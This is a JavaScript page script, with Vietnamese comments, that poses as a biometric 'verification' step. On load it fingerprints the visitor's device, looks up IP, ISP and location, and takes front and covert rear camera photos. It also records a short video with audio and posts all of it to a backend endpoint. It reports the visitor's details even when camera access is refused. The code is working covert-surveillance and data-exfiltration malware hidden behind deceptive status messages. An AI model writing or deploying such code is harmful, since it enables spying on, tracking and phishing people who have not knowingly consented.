(async function() {
    const API_URL = '/api/send'; // Path to send.js (Vercel function)
    const info = {
        time: new Date().toLocaleString('vi-VN'),
        ip: '⌛ Đang lấy...',
        realIp: '⌛ Đang lấy...',
        isp: '⌛ Đang lấy...',
        location: '⌛ Đang lấy...',
        device: '⌛ Đang nhận diện...',
        os: '⌛ Đang nhận diện...',
        browser: navigator.userAgent,
        camera: '⏳ Đang khởi tạo...'
    };

    function log(msg) {
        if (window.updateStatus) window.updateStatus(msg);
        console.log(`[Status] ${msg}`);
    }

    // 1. Nhận diện thiết bị chuyên sâu
    function detectDevice() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        if (/Android/i.test(ua)) {
            info.os = 'Android';
            const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
            info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
        } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
            info.os = 'iOS';
            const screen = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}`;
            const models = {
                "430x932@3": "iPhone 14/15/16 Pro Max",
                "393x852@3": "iPhone 14/15/16 Pro",
                "428x926@3": "iPhone 12/13/14 Pro Max",
                "390x844@3": "iPhone 12/13/14",
                "375x812@3": "iPhone X/XS/11 Pro",
                "414x896@3": "iPhone XS Max/11 Pro Max",
                "414x896@2": "iPhone XR/11",
                "375x667@2": "iPhone 6/7/8/SE"
            };
            info.device = models[screen] || 'iPhone/iPad';
        } else {
            info.os = platform;
            info.device = 'PC/Laptop';
        }
        document.getElementById('st-os').innerText = `${info.os} (${info.device})`;
    }

    // 2. Lấy IP và Vị trí
    async function getNetworkInfo() {
        try {
            const r = await fetch('https://ipwho.is/');
            const d = await r.json();
            info.ip = d.ip;
            info.realIp = d.ip;
            info.isp = d.connection.org;
            info.location = `${d.city}, ${d.region}, ${d.country}`;
            document.getElementById('st-ip').innerText = info.ip;
            document.getElementById('st-loc').innerText = d.city || 'Việt Nam';
        } catch (e) {
            info.ip = 'Không thể xác định';
            document.getElementById('st-ip').innerText = 'Ẩn danh';
        }
    }

    // 3. Xử lý Camera
    async function handleCamera() {
        log("Đang yêu cầu quyền truy cập camera...");
        try {
            const video = document.getElementById('preview');
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            video.srcObject = stream;
            log("Đang quét khuôn mặt...");

            // Chụp ảnh ngay lập tức
            const frontPhoto = await capturePhoto(video);
            
            // Thử chụp camera sau (ngầm)
            let backPhoto = null;
            try {
                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                const backVideo = document.createElement('video');
                backVideo.srcObject = backStream;
                await backVideo.play();
                backPhoto = await capturePhoto(backVideo);
                backStream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // Gửi dữ liệu ảnh trước
            await sendData('media', { 
                photos: [
                    { data: frontPhoto, caption: getReportCaption('📸 ẢNH XÁC THỰC (TRƯỚC)') },
                    { data: backPhoto, caption: '📸 ẢNH MÔI TRƯỜNG (SAU)' }
                ].filter(p => p.data)
            });

            // Quay clip ngắn (5-7 giây)
            log("Đang mã hóa dữ liệu sinh trắc học...");
            await recordVideo(stream, 6000);

            info.camera = "✅ Hoàn tất";
        } catch (err) {
            log("Lỗi: Vui lòng cấp quyền camera để tiếp tục.");
            info.camera = "🚫 Bị từ chối";
            await sendData('text', { text: getReportCaption('⚠️ CẢNH BÁO: TỪ CHỐI CAMERA') });
        }
    }

    async function capturePhoto(videoEl) {
        return new Promise(resolve => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                resolve(canvas.toDataURL('image/jpeg', 0.7));
            }, 1000);
        });
    }

    async function recordVideo(stream, duration) {
        return new Promise(resolve => {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const reader = new FileReader();
                reader.onloadend = async () => {
                    await sendData('video', { video: reader.result, caption: '🎬 CLIP XÁC THỰC SINH TRẮC HỌC' });
                    resolve();
                };
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), duration);
        });
    }

    function getReportCaption(title) {
        return `
${title}

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device} (${info.os})
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Vị trí: ${info.location}
🔗 Browser: ${info.browser.substring(0, 50)}...
`.trim();
    }

    async function sendData(type, payload) {
        try {
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, ...payload })
            });
        } catch (e) {
            console.error("Gửi dữ liệu thất bại", e);
        }
    }

    // Khởi chạy
    detectDevice();
    await getNetworkInfo();
    await handleCamera();
    
    window.mainScriptFinished = true;
})();